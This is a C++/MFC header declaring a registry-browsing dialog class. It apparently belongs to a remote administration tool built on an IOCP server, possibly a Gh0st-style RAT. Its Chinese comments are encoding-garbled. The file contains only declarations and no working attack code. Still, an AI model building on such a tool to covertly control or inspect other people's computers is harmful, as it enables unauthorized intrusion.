#pragma once
#include "afxcmn.h"

#include "IOCPServer.h"

// CRegisterDlg �Ի���

class CRegisterDlg : public DialogBase
{
	DECLARE_DYNAMIC(CRegisterDlg)

public:
	CRegisterDlg(CWnd* Parent, Server* IOCPServer=NULL, CONTEXT_OBJECT *ContextObject=NULL);   // ��׼���캯��
	virtual ~CRegisterDlg();

// �Ի�������
	enum { IDD = IDD_DIALOG_REGISTER };

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

	DECLARE_MESSAGE_MAP()
public:

	BOOL m_bIsWorking;// ���ڴ���ע���
	CTreeCtrl m_Tree;
	CImageList	m_ImageListTree;   //���ؼ��ϵ�ͼ��	
	CListCtrl m_ControlList;
	CImageList m_ImageListControlList;         //ControlList�ϵ�ͼ��
	virtual BOOL OnInitDialog();
	afx_msg void OnClose();
	HTREEITEM	m_hRoot;
	HTREEITEM	HKLM;
	HTREEITEM	HKCR;
	HTREEITEM	HKCU;
	HTREEITEM	HKUS;
	HTREEITEM	HKCC;
	HTREEITEM   m_hSelectedItem;
	BOOL m_isEnable;
	char GetFatherPath(CString& strFullPath);
	CString GetFullPath(HTREEITEM hCurrent);
	afx_msg void OnTvnSelchangedTree(NMHDR *pNMHDR, LRESULT *pResult);
	void OnReceiveComplete(void);
	void AddPath(char* szBuffer);
	void AddKey(char* szBuffer);
};
